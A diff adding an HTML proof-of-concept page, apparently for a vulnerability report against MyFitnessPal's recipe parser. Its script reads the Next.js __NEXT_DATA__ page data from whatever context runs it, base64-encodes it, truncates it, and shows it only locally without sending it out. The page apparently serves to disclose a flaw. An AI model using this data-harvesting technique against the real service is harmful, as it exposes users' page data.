@@ -1,0 +1,91 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>MFP recipe_parser — Safe PoC</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body { font-family: system-ui, -apple-system, Roboto, Arial; padding: 24px; line-height: 1.4; }
+    pre { background:#111; color:#dcdcdc; padding:12px; border-radius:6px; overflow:auto; max-height:320px; }
+    .ok { color: green; font-weight: 600; }
+    .warn { color: #b35; font-weight: 600; }
+  </style>
+</head>
+<body>
+  <h1>MyFitnessPal recipe_parser — Safe PoC</h1>
+  <p id="status">Checking for NEXT_DATA…</p>
+
+  <h2>Truncated base64 of NEXT_DATA (display only)</h2>
+  <pre id="display">—— not found yet ——</pre>
+
+  <script>
+  (function() {
+    function base64Encode(s) {
+      try {
+        // btoa works on binary-safe ascii strings; use TextEncoder for utf-8
+        const u8 = new TextEncoder().encode(s);
+        let binary = '';
+        const chunk = 0x8000;
+        for (let i = 0; i < u8.length; i += chunk) {
+          binary += String.fromCharCode.apply(null, Array.from(u8.subarray(i, i + chunk)));
+        }
+        return btoa(binary);
+      } catch (e) {
+        return '[base64-failed]';
+      }
+    }
+
+    // 1) Try common pattern used by Next.js
+    let dataText = null;
+    const el = document.getElementById('__NEXT_DATA__') || document.querySelector('script[id^="__NEXT_DATA__"]');
+    if (el) {
+      dataText = el.textContent || el.innerText || null;
+    }
+
+    // 2) Fallback: check window.__NEXT_DATA__ if available (some frameworks attach it)
+    if (!dataText && window.__NEXT_DATA__) {
+      try {
+        dataText = JSON.stringify(window.__NEXT_DATA__);
+      } catch (e) {
+        dataText = String(window.__NEXT_DATA__);
+      }
+    }
+
+    const status = document.getElementById('status');
+    const display = document.getElementById('display');
+
+    if (!dataText) {
+      status.innerHTML = '<span class="warn">NEXT_DATA not found in this page context.</span>';
+      display.textContent = 'No NEXT_DATA found. That likely means the attacker HTML was fetched server-side and not executed in the browser, or the page does not include NEXT_DATA.';
+      console.warn('[PoC] NEXT_DATA not found');
+      return;
+    }
+
+    status.innerHTML = '<span class="ok">NEXT_DATA found in page.</span>';
+
+    // base64 encode the JSON and truncate to a manageable length for display only
+    const b64 = base64Encode(dataText);
+    const TRUNC = 1600; // show first 1600 chars only for safety / readability
+    const shown = b64.length > TRUNC ? b64.slice(0, TRUNC) + '…[truncated]' : b64;
+
+    display.textContent = shown;
+
+    // Also print a short human-readable snippet of keys (safe local display)
+    try {
+      const obj = JSON.parse(dataText);
+      let keys = [];
+      if (obj && obj.props) {
+        keys = Object.keys(obj.props).slice(0,10);
+      } else {
+        keys = Object.keys(obj).slice(0,10);
+      }
+      console.info('[PoC] NEXT_DATA keys (truncated):', keys);
+    } catch (e) {
+      console.info('[PoC] NEXT_DATA parsing failed for key extraction');
+    }
+
+    console.info('[PoC] Base64 (truncated) of NEXT_DATA:', shown);
+  })();
+  </script>
+</body>
+</html>
